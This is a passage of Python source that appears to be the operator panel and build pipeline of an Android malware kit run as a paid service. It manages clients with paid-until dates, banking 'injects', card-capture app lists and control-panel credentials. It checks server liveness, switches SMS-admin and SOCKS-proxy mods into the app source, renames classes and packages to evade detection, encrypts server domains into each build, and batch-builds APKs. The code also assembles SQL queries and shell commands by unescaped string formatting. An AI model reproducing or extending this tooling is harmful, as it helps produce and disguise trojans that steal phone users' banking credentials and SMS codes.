		function showBlock(name, uid)
		{
			$('textarea[id^="id_' + uid + '"]').each(function(index, elem){ $(elem).hide(); })
			$('#id_' + uid + '_' + name).show()
		}
		</script>
		<table class='table table-bordered' style='margin: 20px; margin-left: 0px; background-color: #eee'>
		'''

		self.force_log(html)
		
		# type 'ip/domain', ip/domain, is_main bool
		elems = [['ip', BACKEND, True], ['ip', FRONTEND, True]]

		failed = False
		for data in elems:
			is_ip, elem, is_main = data
			is_main_t = '[main] ' if is_main else ''
			is_ip_t = '[ip] ' if is_main else '[domain] '

			self.force_log('<tr><td>Check {}{}{}... '.format(is_main_t, is_ip_t, elem))
			
			res = self.check(elem, is_ip)
			if res is True:
				html = '<b style="color: blue">OK</b></td></tr>'
			else:
				html = self.hide_text(hlp.textarea(res, show=False)) + '</td></tr>'
			
			self.force_log(html)
	
			if is_main and res is not True:
				failed = True
				break
		
		if failed:
			self.force_log('<tr><td colspan="2">Done</td></tr></table>')
			return ''

		sql = 'select id, name, notes, domains from `clients` where status="active" order by id desc'
		data = self.db.execute(sql)
		if self.db.last_error != '':
			print(self.db.last_error)
		
		for client in data:
			cid, name, notes, domains = client
			
			self.force_log('<tr><td>client <a href="?client_id={}&action=edit_client"><b>{}</b></a>..<br />'.format(cid, name))
			
			ips = hlp.parse_all(r'@([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)', notes)
			if ips is False:
				self.force_log('last server ip not found<br />')
			else:
				last_ip = ips[0]
				self.force_log('last server ip: {}.. '.format(last_ip))
				
				res = self.check(last_ip)
				if res is True:
					html = '<b style="color: blue">OK</b><br />'
				else:
					html = '<b style="color: red">FAIL</b> ' + self.hide_text(hlp.textarea(res, show=False)) + '<br />'
				self.force_log(html)
				
			domains = [d.strip() for d in domains.split('\n') if d.strip() and d.count('.') == 1]

			if not domains:
				self.force_log('no domains found<br />')
			else:
				for dom in domains:
					self.force_log('check domain: {}.. '.format(dom))
					res = self.check(dom)
					if res is True:
						html = '<b style="color: blue">OK</b><br />'
					else:
						html = '<b style="color: red">FAIL</b> ' + self.hide_text(hlp.textarea(res, show=False)) + '<br />'
					self.force_log(html)
					
		self.force_log('<tr><td colspan="2">Done</td></tr></table>')
		return ''
		
	def check(self, elem, is_ip=False):
		
		http = httpClass(hlp.parent_doll(silent=True), False)
		page = http.get('https://{}'.format(elem))
		if '403 Forbidden' in page:
			return True
		else:
			return str(http.last_headers) + page
		
	def check_OLD(self, elem, is_ip=False):
		
		cmd = '''ping -c 3 {}'''.format(elem)
		res = hlp.execute(cmd, returnFull=True)
		res = cmd +'\n' + res
		#hlp.textarea(res)
		if '0% packet loss' in res:
			return True
		else:
			return res
		
	def force_log(self, text):
		sys.stdout.buffer.write(text.encode())
		sys.stdout.flush()
		
	def show_access_list(self, cid=None):

		one_client = ' and id={} '.format(cid) if cid is not None else ''
		sql = 'select * from `clients` where status="active" {} order by id desc'.format(one_client)
		#~ return sql
		data = self.db.execute(sql)
		if self.db.last_error != '':
			print(self.db.last_error)
			
			
		html = ''
		if cid is None:
			html += '''		<div class='row'>
			<div class='col-md-2' style='margin-top: 20px'>
				<a href='start.py'>
				<button class='btn btn-primary'>Back</button>
				</a>
			</div>
			<div class='col-md-10'>
				<h1>Clients access list</h1>
			</div>
		</div>'''
		
		html += '''
		<style type='text/css'>
		.info_block {
			width: 400px; 
			height: 100px;
			display: none;
		}
		
		.client_tr {
			background-color: #E6ECED;
		}
		.client_tr:HOVER {
			background-color: white;
		}
		</style>
		<script>
		function showBlock(name, uid)
		{
			$('textarea[id^="id_' + uid + '"]').each(function(index, elem){ $(elem).hide(); })
			$('#id_' + uid + '_' + name).show()
		}
		</script>
		<table class='table table-bordered' style='margin-left: 0px'>
		
		'''
		for d in data:
			is_active = '' if d[6] == 'active' else ' style="color: grey" '
			domains = [v.strip() for v in d[7].split('\n') if v.strip()]
			domain = hlp.rand(domains)
			
			access_data = '''
https://{domain}/{d[2]}/{d[13]}
Basic auth: {d[3]}
Admin auth: {d[4]}
'''.format(**locals())
			
			html += '''
			<tr class='client_tr'>
				<td {is_active}>#{d[0]} <b>{d[1]}</b><br /><small style='color: blue'>{d[2]}</small>
				<br /><a href='?client_id={d[0]}&action=edit_client'>Edit</a>
				<br /><a href='?client_id={d[0]}&action=rebuild_client'>Rebuild</a></td>
				<td>
				<a href='https://{domain}/{d[2]}/{d[13]}/' target='_blank'>https://{domain}/{d[2]}/{d[13]}/</a><br />
				Basic<br />
					<input type="text" onclick="this.select()" value="{d[3]}" size='30' /><br />
					Admin<br />
					<input type="text" onclick="this.select()" value="{d[4]}" size='30' />
				</td>
				<td>
					<select onchange='showBlock(this.options[this.selectedIndex].value, {d[0]})'>
						<option selected value='about'>About</option>
						<option value='access'>Access data</option>
						<option value='domains'>Domains</option>
						<option value='cc_on'>CC</option>
						<option value='injects'>Inject</option>
						<option value='minimize'>Minimize mod</option>
					</select>
					<textarea id='id_{d[0]}_about' class='info_block' style='display: block'>{d[5]}</textarea>
					<textarea id='id_{d[0]}_access' class='info_block'>{access_data}</textarea>
					<textarea id='id_{d[0]}_domains' class='info_block'>{d[7]}</textarea>
					<textarea id='id_{d[0]}_cc_on' class='info_block'>{d[8]}</textarea>
					<textarea id='id_{d[0]}_injects' class='info_block'>{d[9]}</textarea>
					<textarea id='id_{d[0]}_minimize' class='info_block'>{d[10]}</textarea>
				</td>
				<!-- <td>{d[11]}</td> -->
			</tr>
			'''.format(**locals())
			
		return html + '</table>'
		
	def add_day_to_active(self):
		
		sql = 'update `clients` set `paid_until`=DATE_ADD(paid_until, INTERVAL 1 DAY) where status="active"'
		self.db.execute(sql)
		if self.db.last_error != '':
			print(self.db.last_error)
			
	def manual_obfuscate_dir(self, old_name, package_base_name):
		#~ print('RENAME {}<br />\n'.format(old_name))
		html = ''
		s = Search()
		s.find_recursive(self.root + 'app/src/main/')
		
		file_to_rename = ''
		
		new_name = self.get_obfuscate_name(is_dir=True)
		for f in s.files:
			d = hlp.f_read(f)
			#~ print('+'+package_base_name+'.'+old_name + '+')
			if package_base_name+'.'+old_name in d:
				#~ print('FILE: ' + f + '<br />\n')
				
				new_data = d.replace(package_base_name+'.'+old_name, package_base_name+'.'+new_name)
				hlp.f_write(f, new_data)

		amPath = self.root + 'app/src/main/AndroidManifest.xml'
		am = hlp.f_read(amPath)
		am = am.replace('android:name=".'+old_name, 'android:name=".'+new_name)
		hlp.f_write(amPath, am)
		
		dir2rename = ''
		for d in s.dirs:
			#~ print('DIR: {}\n'.format(d))
			if d.endswith('/{}'.format(old_name)):
				#~ print('DIR 2 RENAME: {}'.format(d))
				dir2rename = d
				break
				
		if dir2rename:
			new_dir_name = dir2rename.rsplit('/', 1)[0] + '/' + new_name
			html += 'rename dir {} -> {}<br />'.format(dir2rename, new_dir_name)
			cmd = 'mv {} {}'.format(dir2rename, new_dir_name)
			#~ print(cmd)
			res = hlp.execute(cmd)
			
		#~ print('RENAME {} DONE<br />\n'.format(old_name))
		return html
	
	def get_obfuscate_name(self, is_dir=False):
		type_ = 'C' if is_dir else 'p'
		name = '{}0{}{}'.format(type_, hlp.rand(10, 99), hlp.password(1, src='eng'))
		if name in self.__used_obfuscate_names:
			return self.get_obfuscate_name(is_dir)
		else:
			self.__used_obfuscate_names.append(name)
			return name

	#~ def scan_existing_names(self):
		#~ 
		#~ s = Search()
		#~ s.find_recursive(self.root + 'app/src/main/')
#~ 
		#~ for f in s.files:
			#~ if f.endswith('.java'):
				#~ name = f.rsplit('.', 1)[0]
				#~ print('ADD {} TO OBF<br />\n'.format(name))
				#~ self.__used_obfuscate_names.append(name)
		
		#~ print('TOTAL<br />')
		#~ print(self.__used_obfuscate_names)
		
	def manual_obfuscate(self, old_name):
		html = ''
		#~ print('RENAME {}<br />\n'.format(old_name))
		s = Search()
		s.find_recursive(self.root + 'app/src/main/')
		
		file_to_rename = ''
		
		new_name = self.get_obfuscate_name()
		
		for f in s.files:
			d = hlp.f_read(f)
			
			if old_name in d:
				#print('FILE: ' + f + '<br />\n')
				#d = d.replace('DeviceAdminReceiver', '%PRESERVE001%')
				d = d.replace(old_name, new_name)#.replace('%PRESERVE001%', 'DeviceAdminReceiver')
				hlp.f_write(f, d)
				
				file_name = f.rsplit('/', 1)[-1]
				
				if file_name.replace('.java','') == old_name:
					file_to_rename = f
					
		if file_to_rename:
			file_path, file_name = file_to_rename.rsplit('/', 1)
			new_file_name = file_path +'/'+ new_name + '.java'
			if not self.console_output:
				html += 'RENAME_FILE {} to {}<br />'.format(file_to_rename, new_file_name)
				
			res = hlp.execute('mv {} {}'.format(file_to_rename, new_file_name))
			#~ print(res)
			
		#~ print('RENAME {} DONE<br />\n'.format(old_name))
		return html

	# ADD MOD sms_admin to source
	def add_mod_sms_admin(self, pkg_name, mode=2):
		# mode 1 - on start, 2 - on intercept command [default]
		html = ''
		
		# change manifest
		#~ man_mod = self.root_builder + 'src_mods/sms_admin/AndroidManifest.xml'
		#~ data = hlp.f_read(man_mod)
		
		# update pkg in piece of manifest
		#~ data = hlp.sub(r'com\.[^\.]+', 'com.{}'.format(pkg_name), data)
		
		#~ man = self.root + 'app/src/main/AndroidManifest.xml'
		#~ manifest = hlp.f_read(man)
		#~ 
		#~ manifest = manifest.replace('</application>', data + '\n</application>')
		#~ hlp.f_write(man, manifest)
		
		# enable in Constant
		constant = self.root + 'app/src/main/java/com/{}/constants/Constant.java'.format(pkg_name)
		data = hlp.f_read(constant)
		data = hlp.sub(r'SMS_ADMIN_REQUIRED\s*=\s*[a-z]+', 'SMS_ADMIN_REQUIRED = true', data)
		
		if mode == 1: # get admin on start
			data = hlp.sub(r'SMS_ADMIN_REQUIRED_ON_START\s*=\s*[a-z]+', 'SMS_ADMIN_REQUIRED_ON_START = true', data)
			
		hlp.f_write(constant, data)
		
		html += '<span style="color: blue">SMS mod has been set</span><br />'
		return html
		
		#~ f = self.root_builder + 'src_mods/sms_admin/sms'
		#~ to = self.root + 'app/src/main/java/com/{}/'.format(pkg_name)
		#~ html += 'Copy {} -> {}\n'.format(f, to)
		#~ hlp.execute('cp -rp {} {}'.format(f, to))
		#~ 
		#~ files = hlp.ls2(to + 'sms', files=True)
		#~ for f in files:
			#~ data = hlp.f_read(f)
			#~ data = hlp.sub(r'com\.[^\.]+\.sms', 'com.{}.sms'.format(pkg_name), data)
			#~ hlp.f_write(f, data)
			#~ 
		#~ # Change manifest
		#~ man_mod = self.root_builder + 'src_mods/sms_admin/AndroidManifest.xml'
		#~ data = hlp.f_read(man_mod)
		#~ 
		#~ man = self.root + 'app/src/main/AndroidManifest.xml'
		#~ manifest = hlp.f_read(man)
		#~ 
		#~ manifest = manifest.replace('</application>', data + '\n</application>')
		#~ hlp.f_write(man, manifest)
#~ 
		#~ # enable in Constant
		#~ constant = self.root + 'app/src/main/java/com/{}/constants/Constant.java'.format(pkg_name)
		#~ data = hlp.f_read(constant)
		#~ data = hlp.sub(r'SMS_ADMIN_REQUIRED = [a-z]+', 'SMS_ADMIN_REQUIRED = true', data)
		#~ hlp.f_write(constant, data)
#~ 
		#~ html += '<span style="color: blue">SMS Admin mod has been set</span><br />'
		#~ return html

	def rm_mod_sms(self, pkg_name):
		
		mod_path = self.root + 'app/src/main/java/com/{}/sms'.format(pkg_name)
		hlp.execute('rm -rf {}'.format(mod_path))
		
		# change manifest
		man = self.root + 'app/src/main/AndroidManifest.xml'
		data = hlp.f_read(man)
		
		data = hlp.sub(r'(<!-- mod:sms_admin[\S\s]+?end_mod:sms_admin.*-->)', '', data)
		hlp.f_write(man, data)
		
		return '<span style="color: #90010E">Sms mod has been disabled</span><br />'
		
	def rm_mod_socks(self, pkg_name):
		
		mod_path = self.root + 'app/src/main/java/com/{}/socks'.format(pkg_name)
		hlp.execute('rm -rf {}'.format(mod_path))
		
		f = self.root + 'app/src/main/java/com/{}/api/handlers/SocksHandler_disabled.java'.format(pkg_name)
		to = self.root + 'app/src/main/java/com/{}/api/handlers/SocksHandler.java'.format(pkg_name)

		html = 'Copy {} -> {}\n'.format(f, to)
		hlp.execute('mv -f {} {}'.format(f, to))
		if hlp.exists(to):
			data = hlp.f_read(to)
			data = data.replace('SocksHandler_disabled', 'SocksHandler')
			data = hlp.sub(r'com\.[^\.]+', 'com.{}'.format(pkg_name), data)
			hlp.f_write(to, data)

		# change manifest
		man = self.root + 'app/src/main/AndroidManifest.xml'
		data = hlp.f_read(man)
		
		data = hlp.sub(r'(<!-- mod:socks[\S\s]+?end_mod:socks.*-->)', '', data)
		hlp.f_write(man, data)
		
		return '<span style="color: #90010E">Socks mod has been disabled</span><br />'

		
	def add_mod_socks(self, pkg_name):

		html = ''
		
		f = self.root + 'app/src/main/java/com/{}/api/handlers/SocksHandler_disabled.java'.format(pkg_name)
		hlp.f_delete(f)
		# add socks dir
		#~ f = self.root_builder + 'src_mods/socks/socks'
		#~ to = self.root + 'app/src/main/java/com/{}/'.format(pkg_name)
		#~ html += 'Copy {} -> {}\n'.format(f, to)
		#~ hlp.execute('cp -rp {} {}'.format(f, to))
		

		# change pkg in socks dir
		#~ files = hlp.ls2(to + 'socks', files=True)
		#~ for f in files:
			#~ data = hlp.f_read(f)
			#~ data = hlp.sub(r'com\.[^\.]+\.socks', 'com.{}.socks'.format(pkg_name), data)
			#~ hlp.f_write(f, data)
			
		# change pkg in socksHandler
		#~ f = self.root_builder + 'src_mods/socks/SocksHandler.java'
		#~ to = self.root + 'app/src/main/java/com/{}/api/handlers/SocksHandler.java'.format(pkg_name)
#~ 
		#~ html += 'Copy {} -> {}\n'.format(f, to)
		#~ hlp.execute('cp -f {} {}'.format(f, to))
		#~ data = hlp.f_read(to)
		#~ data = hlp.sub(r'com\.[^\.]+', 'com.{}'.format(pkg_name), data)
		#~ hlp.f_write(to, data)

		# change manifest
		#~ man_mod = self.root_builder + 'src_mods/socks/AndroidManifest.xml'
		#~ data = hlp.f_read(man_mod)
		#~ 
		#~ # update pkg in piece of manifest
		#~ data = hlp.sub(r'com\.[^\.]+', 'com.{}'.format(pkg_name), data)
		#~ 
		#~ man = self.root + 'app/src/main/AndroidManifest.xml'
		#~ manifest = hlp.f_read(man)
		#~ 
		#~ manifest = manifest.replace('</application>', data + '\n</application>')
		#~ hlp.f_write(man, manifest)
		html += '<span style="color: blue">Socks mod has been set</span><br />'
		return html


	def rename_package(self, old_name, new_name):
		# com.shit
		# com.shit2
		
		html = ''

		# files = [
		# 	self.root + '.idea/workspace.xml', 
		# 	]

		s = Search()
		s.find_recursive(self.root + 'app/src/main/')

		files = s.files
		
		for f in files:
			try:			
				d = hlp.f_read(f)
				if old_name in d:
					hlp.f_write(f, d.replace(old_name, new_name))
					#~ html += '{} done\n'.format(f)
			except:
				continue
		
		d = hlp.f_read(self.root + 'app/build.gradle')
		d = hlp.sub(r'applicationId "[^"]+?"', 'applicationId "{}"'.format(new_name), d)
		hlp.f_write(self.root + 'app/build.gradle', d)

		d = hlp.f_read(self.root + 'app/proguard-project.txt')
		d = hlp.sub(r'class com\.[^.]+?\.MainActivity', 'class {}.MainActivity'.format(new_name), d)
		hlp.f_write(self.root + 'app/proguard-project.txt', d)
		
		
		from_ = old_name.split('.', 1)[1]
		to = new_name.split('.', 1)[1]
		
		hlp.execute('mv {}app/src/main/java/com/{} {}app/src/main/java/com/{}'.format(self.root, from_, self.root, to))
		
		return html

	def merge_lists(self, minimize_apps, minimize_apps_client):

		minimize_apps = self.str_to_list(minimize_apps)
		minimize_apps_client = self.str_to_list(minimize_apps_client)
		
		new_list = []
		for app in minimize_apps:
			
			if '-{}'.format(app) not in minimize_apps_client:
				new_list.append(app)
				
		for app in minimize_apps_client:

			if not app.startswith('-'):
				new_list.append(app)
				
		return new_list

	def get_template_api(self, tpl_id):
		return self.db.execute('select api from templates where id={}'.format(tpl_id))[0][0]
		
	def add_replaces(self, tpl_id, pack_new, custom_api=''):
		# custom_api for multi-apis like "api1,api2,api3"
		
		tpl_data = self.db.execute('select client_id, app_name, api from templates where id={}'.format(tpl_id))[0]
		client_data = self.db.execute('select domains, injects, cc_on from clients where id={}'.format(tpl_data[0]))[0]
		minimize_apps = []#self.db.execute('select xval from settings where xkey="minimize_apps"')[0][0]
		minimize_apps_client = []#self.db.execute('select minimize_apps from clients where id={}'.format(tpl_data[0]))[0][0]
		injects_theme_tmp = self.db.execute('select injects from templates where id={}'.format(tpl_id))[0][0]
		
		injects_theme = []
		for inj in self.str_to_list(injects_theme_tmp):
			if ':' in inj:
				inj = inj.split(':')[0]
				
			injects_theme.append(inj)
		
		minimize_apps = []#self.merge_lists(minimize_apps, minimize_apps_client)
		
		injects_data = {}
		injects_client = []
		for inj in self.str_to_list(client_data[1]):
			if ':' not in inj or inj.startswith('#'):
				continue

			app, id_ = inj.split(':', 1)
			injects_data[app] = id_
			injects_client.append(app)

		injects = self.merge_lists(injects_client, injects_theme)
		
		injects_formatted = ''
		for inj in injects:
			injects_formatted += '{}:{}\n'.format(inj, injects_data[inj])
		
		self.client_data = {
			'client_id': tpl_data[0],
			'domains': client_data[0],
			'domains_plain': client_data[0],
			#'injects': injects_formatted,
			#'cc_on': client_data[2],
			'app_name': tpl_data[1],
			'api': custom_api if custom_api else tpl_data[2],
			#'minimize_apps': minimize_apps,
		}
		
		html = ''
		# base
		replaces = self.db.execute('select filepath, regex, new_data from replaces where level="base" and enabled=1')
		html += 'Base replaces.. \n'
		for repl in replaces:
			filepath, regex, new_data = repl
			#~ filepath = filepath.replace('java/com/', 'java/{}/'.format(self.com_replace))
			html += '{} | {} | {}\n'.format(filepath, regex, new_data)
			html += self.make_replace(filepath, regex, new_data, pack_new)
		
		# template
		replaces = self.db.execute('select filepath, regex, new_data from replaces where level="template" and entity_id={} and enabled=1'.format(tpl_id))
		html += 'Template replaces.. \n'
		for repl in replaces:
			filepath, regex, new_data = repl
			html += '{} | {} | {}\n'.format(filepath, regex, new_data)
			html += self.make_replace(filepath, regex, new_data, pack_new)
								
		# client
		replaces = self.db.execute('select filepath, regex, new_data from replaces where level="client" and entity_id={} and enabled=1'.format(self.client_data['client_id']))
		html += 'Client replaces.. \n'
		for repl in replaces:
			filepath, regex, new_data = repl
			html += '{} | {} | {}\n'.format(filepath, regex, new_data)
			html += self.make_replace(filepath, regex, new_data, pack_new)
			
		return html
		
	def delete_old_apk(self):
		
		cmd = 'rm -f {}apks/*.apk'.format(self.root)
		html = cmd + '\n'
		html += hlp.execute(cmd, returnFull=True)
		return html + '\nDone'
		
	def make_replace(self, filepath, regex, new_data, package):

		filepath = filepath.replace('%PACKAGE%', package)
		#~ new_data = new_data.replace('%DATE%', hlp.human_date(format_d='%d%m%y'))
		
		if '%API%' in new_data:
			date = hlp.human_date(format_d='%d%m%y')
			api = self.client_data['api']
			if '%DATE%' not in api:
				api = '%DATE%' + api
				
			api = api.replace('%DATE%', date)
			new_data = new_data.replace('%API%', api)
			
		new_data = new_data.replace('%PACKAGE%', '{}.{}'.format(self.com_replace, package))
		
		# self.client_data
		filebody = hlp.f_read(self.root + filepath)
		
		for key, val in self.client_data.items():
			if '%'+key.upper()+'%' in new_data:
				new_data = new_data.replace('%'+key.upper()+'%', self.process_macros(key, val))

		filebody = hlp.sub(regex, new_data, filebody)
		hlp.f_write(self.root + filepath, filebody)
		return ''

	def str_to_list(self, data):
		if isinstance(data, str):
			data = data.split('\n')
			
		d = [v.strip() for v in data if v.strip() and not v.strip().startswith('#')]
		return list(set(d))
		
	def aes_encode(self, string, key_):
		return hlp.execute("php aes.php \"{}\" {}".format(string, key_), returnFull=True)
		
	def process_macros(self, macros, data):
		
		result = ''
		
		if macros == 'domains' or macros == 'domains_plain':
			
			folder = self.db.execute('select folder from clients where id={}'.format(self.client_data['client_id']))[0][0]

			domains = self.str_to_list(data)

			for elem in domains:
				result += 'https://{}/{}/|'.format(elem.strip(), folder)
			
			if macros == 'domains_plain':
				result = result[:-1]
			else:
				result = self.aes_encode(result[:-1], 'not-cache')
		
		#~ elif macros == 'injects':
			#~ 
			#~ injes = self.str_to_list(data)
			#~ sz = len(injes)
			#~ 
			#~ for i, inj in enumerate(injes):
				#~ 
				#~ app, index = inj.split(':')
#~ 
				#~ if i == sz-1: # last elem without ,
					#~ result += r'{{\"to\": \"{}\",\"body\": \"%API_URL%%PARAM%{}\"}}'.format(app, index)
				#~ else:
					#~ result += r'{{\"to\": \"{}\",\"body\": \"%API_URL%%PARAM%{}\"}},'.format(app, index)
					#~ 
			#~ result = '"[' + result + ']".replace("%PARAM%", "njs2/?m=")'
				#~ 
		#~ elif macros == 'cc_on':
			#~ 
			#~ apps = self.str_to_list(data)
			#~ 
			#~ for app in apps:
				#~ result += '"{}".replace("?", ""),\n'.format(self.pack_string(app, '?'))
				#~ 
			#~ result = result.strip()
				#~ 
		#~ elif macros == 'minimize_apps':
			#~ 
			#~ apps = self.str_to_list(data)
			#~ 
			#~ for app in apps:
				#~ result += '"{}".replace("?", ""),\n'.format(self.pack_string(app, '?'))
				#~ 
			#~ result = result.strip()

		elif macros == 'app_name':
			
			result = data.strip()
			
		else:
			pass

		return result

	def pack_string(self, string, symbol):
		
		res = ''
		for char in string:
			res += char
			if hlp.rand(0, 10) > 3:
				res += symbol
		
		return res

	def zip(self, name, apks):
		if not name:
			return '<span style="color: red">Empty name</span>'
		
		zip_file = name
		html = 'Making zip {}\n'.format(zip_file)
		
		cmd = 'zip -9 --junk-paths {} '.format(name)
		for apk in apks:
			cmd += ' {}apks/{} '.format(self.root, apk)
		return html + hlp.execute(cmd, returnFull=True) + '\nZip <b>{}</b> is ready\n'.format(zip_file)
		
	def delete_apks(self, apks):
		
		html = 'Delete apks {}\n'.format(', '.join(apks))
		for apk in apks:
			f = '{}apks/{}'.format(self.root, apk)
			hlp.execute('rm ' + f)
			html += '<b>{}</b> deleted\n'.format(f)
		
		return html
		
	def get_backup(self, path_to):

		html = 'Downloading backup from {} to {}\n'.format(self.upload_url, path_to)
		from http_class import httpClass
		http = httpClass(hlp.parent_doll(), False)
		
		if self.builder_basic_auth.strip():
			http.base_auth(*self.builder_basic_auth.split(':'))
			
		http.getfile(self.upload_url, path_to, postdata={'get_backup': 1})
		html += http.last_error
		return html
		
	def upload_update(self, path):
		
		html = 'Uploading {} to {}\n'.format(path, self.upload_url)
		from http_class import httpClass
		http = httpClass(hlp.parent_doll(), False)
		
		if self.builder_basic_auth.strip():
			http.base_auth(*self.builder_basic_auth.split(':'))
			
		page = http.postfile(self.upload_url, {'update.zip': '@'+path})
		html += page
		return html

	def build(self, tpl_id, api_custom=''):
		#~ res =True
		#~ apk_name = 'test.apk'
		#~ self.final_apks.append(apk_name)
		#~ return 'DEBUG Build {} done: {}\n'.format(apk_name, res)
		
		#hlp.execute('rm -rf {}/app/build/'.format(self.root))
		hlp.execute('rm -rf {}app/build/'.format(self.root))

		res = self.db.execute('select name, folder from clients where id in(select client_id from templates where id={})'.format(tpl_id))
		client_name = res[0][0]
		folder_name = res[0][1]
		
		data = self.db.execute('select app_name, api from templates where id={}'.format(tpl_id))[0]
		app_name = data[0].strip().replace(' ', '-')
		
		api = api_custom if api_custom else data[1]
		
		if '%DATE%' not in api:
			api = '%DATE%' + api
			
		api = api.replace('%DATE%', hlp.human_date(format_d='%d.%m.%y'))
		
		apk_name = folder_name + '_' + client_name + '_' + app_name + '_' + api

		hlp.f_delete(self.root + 'apks/{}.apk'.format(apk_name))
		
		res = hlp.execute(self.root_builder + 'sh/release.sh "' + apk_name + '" ' + self.root, returnFull=True)
		
		self.final_apks.append(apk_name + '.apk')
		return 'Build <span style="color: green; font-weight: bold">{}</span> done: {}\n'.format(apk_name, res)

	def get_form_add_themes(self):
		
		html = '''
		<div class='row'>
		sasaasds
		</div>
		'''
		return html
		
	def get_tpls_select(self):
		
		clients = self.db.execute('select id, name from clients where status="active" order by id desc')
		if self.db.last_error != '':
			print(self.db.last_error)
			return ''
			
		html = ''
		clients_links = '<br /><table class="table table-bordered">'
		for client in clients:
			client_id = client[0]
			client_name = client[1]
			
			table = '''
			<table id='table{0}' class="table table-bordered" style='display: none'>
			<tr style='background-color: #E6ECED'>
					<th>id <input id="main_chk_{0}" type="checkbox" onclick='toggleChks({0})' /></th>
					<th>package</th>
					<th>title</th>
					<th>api</th>
			</tr>
			'''.format(client_id)
			
			tpls = self.db.execute('select id, app_name, package_name, api from templates where client_id={} order by id desc'.format(client_id))
			if self.db.last_error != '': 
				print(self.db.last_error)

			for tpl in tpls:
				
				#checked = '' if tpl[0] not in self.default_build else 'checked'		{checked}
				api = tpl[3].replace('%DATE%','*')
				
				table += """<tr style='background-color: white'>
					<td style='width: 50px'>
						<input type='checkbox' name='tpls' value='{tpl[0]}' id='lbl_{client_id}_{tpl[0]}' /> #{tpl[0]}
					</td>
					
					<td><center>{tpl[1]}</center></td>
					<td style='width: 50px'>{tpl[2]}</td>
					<td style='width: 50px'>{api}</td>
				</tr>""".format(**locals())
				#</tr>""".format(tpl[0], tpl[1], tpl[2], checked, client_name, tpl[3].replace('%DATE%','*'), client_id)
			
			table += '</table>'
			clients_links += '''<tr style='background-color: white'><td><input id='switch{1}' type='checkbox' onclick='toggleGroup({1})' />
				<label for='switch{1}'>{0}&nbsp;</label>
			</td><td>{2}</td></tr>'''.format(client_name, client_id, table)
		
		clients_links += '</table>'
		return clients_links + html
		
	def get_tpls_selectOLD(self):
		
		tpls = self.db.execute('select templates.id, app_name, clients.name, templates.package_name, templates.api from templates, clients where templates.client_id=clients.id')
		if self.db.last_error != '':
			print(self.db.last_error)
			
		#~ html = '<ul style="list-style-type: none">'
		html = '<table class="table table-bordered">'
		import operator;
		tpls_d = {} 
		for t in tpls:
			tpls_d[t[0]] = t
			
		i = 0
		colors = ['purple', 'blue', 'green', 'red', 'silver', 'brown', 'orange']
		clients_colors = {}
		color = ''
		for index, c in sorted(tpls_d.items(), key=operator.itemgetter(0)):
			if c[2] not in clients_colors:
				color_ = hlp.next(colors)
				colors.remove(color_)
				clients_colors[c[2]] = color_
				color = color_
			else:
				color = clients_colors[c[2]]
				
			colorx = 'color: {}'.format(color)
			
			checked = '' if c[0] not in self.default_build else 'checked'
			#~ html += "<li><input type='checkbox' {3} name='tpls' value='{0}' id='lbl{0}' /><label style='font-weight: normal; {5}' for='lbl{0}'>&nbsp;&nbsp;#{0} {2} &#151; {1} <b>{6}</b> #{7}</label></li>".format(c[0], c[1], c[2], checked, i, colorx, c[3], c[4].replace('%DATE%','*'))
			html += """<tr>
				<td>#{0}</td>
				<td>
					<input type='checkbox' {3} name='tpls' value='{0}' id='lbl{0}' />
				</td>
				<td style='{5}'>{2}</td>
				<td style='{5}'>{1}</td>
				<td style='{5}'>{6}</td>
				<td style='{5}'>{7}</td>			
			</tr>""".format(c[0], c[1], c[2], checked, i, colorx, c[3], c[4].replace('%DATE%','*'))
			i += 1

		#~ return html + '</ul>'
		return html + '</table>'

	def add_blank_tpl(self, data):
		
		sql = 'select id from clients where name="{}"'.format(data['name'])
		cid = self.db.execute(sql)[0][0]
		
		if self.db.last_error != '':
			print(self.db.last_error)
			
		# 'name','status','folder','admin_access','basic_access','notes','injects','domains','cc_on','paid_until'
		res = self.db.execute('insert into templates values(null, {}, "Tweaker", "System tweaker", "random", "%DATE%", "", 0, 0, "", "")'.format(cid))
		if self.db.last_error != '':
			print(self.db.last_error)
		
	def get_client_info(self, cid):
				
		res = self.db.execute('select name, folder, basic_access, admin_access, notes, status, domains, cc_on, injects, paid_until, panel_folder, stats_folder from clients where id={}'.format(cid))[0]
		if self.db.last_error != '':
			print(self.db.last_error)
			
		data = {
			'name':	res[0],
			'folder': res[1],
			'basic_access': res[2],
			'admin_access': res[3],
			'notes': res[4],
			'status': res[5],
			'domains': res[6],
			'cc_on': res[7],
			'injects':  res[8],
			'paid_until':  res[9].strftime('%d/%m/%Y') if res[9] else '',
			'panel_folder':  res[10],
			'stats_folder':  res[11],
		}

		return data

	def add_client(self, data):
		
		sql = 'insert into clients values(null, "{}", "{}", "{}", "{}", "{}", "{}", "{}", "{}", "{}", "{}", "{}", NOW(), "{}", "{}")'.format(
			data['name'].replace('"', r'\"').strip(),
			data['folder'].replace('"', r'\"').strip(),
			data['basic_access'].replace('"', r'\"').strip(),
			data['admin_access'].replace('"', r'\"').strip(),
			data['notes'].replace('"', r'\"').strip(),
			data['status'].replace('"', r'\"').strip(),
			data['domains'].replace('"', r'\"').strip(),
			data['cc_on'].replace('"', r'\"').strip(),
			data['injects'].replace('"', r'\"').strip(),
			"", # minimize_apps custom
			datetime.strptime(data['paid_until'], '%d/%m/%Y') if data['paid_until'] else '',
			data['panel_folder'].replace('"', r'\"').strip(),
			data['stats_folder'].replace('"', r'\"').strip()
			)
		
		self.db.execute(sql)
		if self.db.last_error != '':
			print(self.db.last_error)
			
		return 'Added success'
		
	def save_client(self, data):
		
		sql = 'update clients set name="{}", folder="{}", basic_access="{}", admin_access="{}", notes="{}", status="{}", domains="{}", cc_on="{}", injects="{}", paid_until="{}", panel_folder="{}", stats_folder="{}" where id={}'.format(
			data['name'].replace('"', r'\"').strip(),
			data['folder'].replace('"', r'\"').strip(),
			data['basic_access'].replace('"', r'\"').strip(),
			data['admin_access'].replace('"', r'\"').strip(),
			data['notes'].replace('"', r'\"').strip(),
			data['status'].replace('"', r'\"').strip(),
			data['domains'].replace('"', r'\"').strip(),
			data['cc_on'].replace('"', r'\"').strip(),
			data['injects'].replace('"', r'\"').strip(),
			datetime.strptime(data['paid_until'], '%d/%m/%Y') if data['paid_until'] else '',
			data['panel_folder'].replace('"', r'\"'),
			data['stats_folder'].replace('"', r'\"'),
			data['client_id'].replace('"', r'\"')
			)
		
		self.db.execute(sql)
		if self.db.last_error != '':
			print(self.db.last_error)
			
		return 'Saved success'

	def save_tpl(self, data):
		
